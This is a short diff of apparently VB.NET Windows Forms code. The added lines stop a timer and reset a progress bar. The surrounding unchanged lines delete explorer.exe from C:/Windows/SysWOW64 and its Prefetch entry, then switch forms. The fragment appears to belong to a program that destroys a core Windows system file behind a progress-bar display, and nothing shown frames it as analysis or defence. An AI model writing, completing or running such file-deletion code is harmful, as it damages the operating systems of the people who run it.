@@ -42,6 +42,8 @@
             My.Computer.FileSystem.DeleteFile("C:/Windows/SysWOW64/explorer.exe")
             My.Computer.FileSystem.DeleteFile("C:/Windows/Prefetch/EXPLORER.EXE-082F38A9.pf")
             Form6.Show()
+            Timer1.Stop()
+            ProgressBar1.Value = 0
             Me.Hide()
         End If
     End Sub
